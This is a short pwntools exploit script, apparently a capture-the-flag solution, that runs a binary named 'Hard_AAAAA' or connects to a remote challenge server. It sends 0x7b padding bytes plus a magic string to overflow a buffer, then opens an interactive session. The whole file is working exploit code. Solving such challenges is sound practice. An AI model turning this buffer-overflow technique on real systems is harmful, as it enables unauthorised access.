#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="i386", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./Hard_AAAAA')
else:
    p = remote('47.103.214.163', 20000)

pd = 'a' * 0x7b
pd += '0O0o\x00O0'
p.sendlineafter('Let\'s 0O0o\\0O0!\n', pd)
p.interactive()
